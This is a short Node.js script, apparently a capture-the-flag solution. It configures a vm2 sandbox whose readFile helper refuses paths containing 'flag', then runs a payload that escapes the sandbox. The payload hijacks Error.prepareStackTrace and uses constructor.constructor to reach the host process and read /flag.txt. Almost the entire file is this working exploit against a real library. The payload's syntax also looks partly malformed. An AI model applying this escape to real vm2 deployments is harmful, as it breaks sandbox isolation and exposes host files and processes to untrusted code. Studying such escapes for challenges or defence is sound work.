const vm2 = require('vm2')

let sbx = {
    readFile: (path) => {
        if(!(new String(path).toString()).includes('flag'))
            return fs.readFileSync(path,{encoding: "utf-8"})
        return null
    },
    sum: (args) => args.reduce((a,b)=>a+b),
}

let vm = new vm2.VM({
    timeout: 20,
    sandbox: sbx,
    fixAsync: true,
    eval: false
})

let result = ":(";
result = new String(vm.run(`sum([]);Error.prepareStackTrace=(e,f)=>{f.constructor.constructor('return process')().mainModule.require('fs').readFileSync('/flag.txt')}(async ()=>{})//`)); 
console.log(result); 
